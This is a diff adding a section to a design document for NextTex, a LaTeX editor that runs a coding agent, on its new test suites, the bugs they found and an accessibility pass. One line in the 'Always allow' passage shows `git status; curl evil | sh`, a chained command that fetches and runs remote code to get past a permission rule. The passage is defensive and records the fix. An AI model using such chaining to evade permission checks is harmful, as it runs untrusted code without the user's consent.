@@ -703,3 +703,176 @@ capped so it stops crossing into the preview; and the logo was redrawn with
 one chevron instead of two two units apart, on an outlined tile — the old
 mark fused into a violet smudge at 18 px, and a brand mark should not spend
 the fill that means *answer the agent*.
+
+## 14. Building the instruments, and what they found
+
+The three audits above were done by reading code and looking at screenshots.
+That is how every bug in them was found, and it is also why this section
+exists: fourteen thousand lines of source were covered by nine hundred lines
+of test, all of them unit tests over `nexttex/`. **Not one HTTP route was
+tested, no frontend code was tested at all, and every browser check had been
+a throwaway script in `/tmp`.**
+
+Writing the plan proved the cost. Reading the app against a coverage map
+turned up three bugs that broke a feature outright — changing the model
+raised a 500, the sign-in screen never advanced after a successful login,
+and the Console/SSO button was wired to a parameter the server does not
+read. None would have survived a suite. Adversarial reading of the same code
+found a dozen more, and the suite itself found several the reading missed.
+
+### What was built
+
+**A scripted agent.** `ProjectAgent` spawns the real `claude` CLI: slow,
+costly, non-deterministic, and it needs an account. So a large part of the
+app — streamed prose, edit chips with their diffs and undo, permission cards
+and their shield, the follow-up queue, usage, model switching — was
+untestable. `nexttex/scripted_agent.py` replays a list of steps from
+`tests/scripts/*.json` through the same event queue the real one writes to.
+An `edit` step performs a real write, so the version, the rebuild, the chip
+and the undo all run for real; a `permission` step really does block until
+somebody answers. A browser test names the script in the first line of its
+question: `#script:permission`.
+
+It has one honest limitation, and it is the one the earlier reviewer warned
+about: a stand-in cannot tell you whether the real SDK still emits the
+message shapes the scripts assume. That is what the `NEXTTEX_LIVE` smoke
+test is for, and it is run by hand.
+
+**API contract tests.** Every route, its documented failures, and a path
+escape assertion on everything that takes one. The fixture ordering is
+load-bearing: `server/main.py` builds `SETTINGS` and `REGISTRY` at *import*
+time and `Settings.load()` writes a config file when it finds none, so the
+environment is redirected at conftest module scope, before anything under
+`server` is imported. Otherwise running the tests hands a different token to
+whatever tab is open.
+
+**A browser tier.** Each spec starts a NextTex of its own — own port, own
+XDG directories, own projects, a config written before the server so the
+token is known rather than scraped from a log line — and drives it against
+the Chromium actually cached on the machine rather than the build number the
+library expects. Every wait is on an observable: a response, a DOM state,
+never a clock. The exception is written down: one spec has to prove a build
+*does not* happen while an equation is unbalanced, and a negative assertion
+needs a clock.
+
+**Property tests** over the two places where being right for the cases
+somebody thought of is not enough: the path fence, and what retention is
+allowed to throw away.
+
+**A hostile-input layer.** None of it is an attack. It is a figure with a
+per cent sign in its name, a chapter pasted from Word, a project of two
+thousand files, a directory that went read-only because something was
+syncing it, a disk that filled up.
+
+**Benchmarks**, on demand, against a project shaped like a thesis: forty
+source files, two megabytes of LaTeX, a populated build directory, a `.git`
+with a working tree. The thresholds are budgets, not records.
+
+### The bugs that mattered
+
+**Two windows on one project destroyed each other's work.** `PUT /file` was
+whole-file last-writer-wins with nothing watching, and the watcher's own
+"this was us" suppression meant the second tab was never even told a save
+had happened — so its autosave wrote a stale buffer over everything the
+first had written, silently, with the tab still showing clean. A save now
+carries a tag for what the browser last agreed the file said, is refused
+rather than believed when the file has moved on, and is broadcast to every
+other tab. The refusal is a banner offering both copies.
+
+That tag was got wrong twice before it was right. A float second was far too
+coarse — saves land a quarter of a second apart, and any slack wide enough
+to absorb filesystem differences was wide enough to wave the clobber
+through. `st_mtime_ns` was better and still wrong: it is only as fine as the
+filesystem chooses to record, and two writes a millisecond apart share one
+on plenty of them. The test caught that by failing one run in three. It is a
+hash of the contents now, which answers the real question anyway.
+
+Closing the loop found one more: history collapses an editing burst into a
+single version, and both windows are "you", so the tab that saved second
+replaced the other tab's version and the text it had overwritten was gone
+from the history as well as from the file. A burst now only collapses within
+the window that made it.
+
+**A server restart killed every open tab, silently.** Forty-two routes
+required a project to be open, including the event stream — so after a
+restart the browser retried a 404 every two seconds forever with nothing on
+screen saying so. "Open" is what a user does to a window, not a
+precondition the server keeps: `session_for` opens a registered project on
+demand, and only the open route marks one as recently opened.
+
+**A reload lost your place.** Not a bug, and it read as one. NextTex now
+comes back to the document with the same files open and the same one in
+front, and leaving for the project list is remembered just as deliberately.
+
+**Ctrl-F did nothing** — on the first press. `searchKeymap` was bound
+without the `search()` extension that provides the panel, and CodeMirror
+installs the missing field in the same transaction that asks to show it, so
+the field never sees the effect. The second press worked. A LaTeX editor
+with no find and replace, one line away from having it.
+
+**"Always allow" was wider than it looked.** The rule was scoped to a Bash
+command's first word, which is only honest for a command that has one:
+`git status; curl evil | sh` starts with `git`, so `Bash:git` covered it for
+good. A command carrying shell syntax now gets no rule at all, is asked
+about every time, and the card does not offer to remember it.
+
+**The compile was doing work three times over.** Every build fired
+`/symbols`, `/words` and `/git` — a full project rescan, a `texcount`
+subprocess and a `git status` — inline on the single event loop, every 1.6
+seconds while somebody typed. During those, the server answered nothing at
+all: no autosave, no streamed token, no PDF. The symbol cache was worse than
+slow: its stamp walk counted `.pdf` files and skipped only `.git` and
+`.nexttex`, so `build/main.pdf` moved the stamp on every compile and the
+whole project was rescanned every time. The benchmark keeps a guard on
+exactly that: if it comes back, `symbols.after_build_ms` goes from about one
+millisecond to about twenty.
+
+**Secondary text on the third surface was unreadable** — 4.22:1 in the light
+theme and 4.33:1 in the dark, against a 4.5:1 requirement. This has now been
+got wrong twice and caught by eye both times, which is not a method. The
+palette is parsed out of `styles.css` and every pairing the app uses is
+measured, in both themes, in under a second.
+
+### What the accessibility pass changed
+
+axe-core over six states in both themes found four things, all of them the
+app's own markup rather than a library's.
+
+The document was an ARIA textbox with no name, so the one region of this app
+that holds the writing was announced as an unlabelled input. It has a name
+now.
+
+The file tabs claimed `role="tab"` without a `tablist` around them, and each
+tab contained its own close button — a control inside a control, announced
+as one thing and reached as two. The fix was not to add the missing role: an
+ARIA tablist promises arrow-key navigation between tabs and a panel
+associated with each one, and this strip has neither, so claiming it would
+tell a screen reader something untrue. The tabs are a labelled group of
+buttons, the close button is a sibling rather than a child, and the open
+file is marked with `aria-current`.
+
+One rule is consciously rejected and written into the spec with its reason:
+`scrollable-region-focusable` wants CodeMirror's scroller to be focusable
+itself, when the focusable editable region inside it *is* how a keyboard
+reaches and scrolls the document. Satisfying it literally would add a tab
+stop that goes nowhere.
+
+Beyond axe there are four checks it cannot make: that Escape closes what it
+opens, that the composer is reachable by tabbing out of the editor, and that
+the permission card's three answers are real buttons with real names — the
+one control in this app where a mistaken click runs a command.
+
+### Where the line is
+
+Worth its maintenance: anything that asserts a contract, anything that
+guards a safety property — path escape, atomic write, undo refusal, the
+permission fence, history permanence — anything that encodes a bug already
+paid for, and the handful of browser specs that prove the core loop still
+works end to end.
+
+Not worth it: snapshot tests of rendered React, which fail on every
+intentional design change and assert nothing about behaviour; a second
+browser spec for a variation the first already covers; tests that assert an
+exact duration rather than a budget; and anything a unit test can pin down.
+Every timing constant in the browser tier is a reason to prefer the layer
+below it.
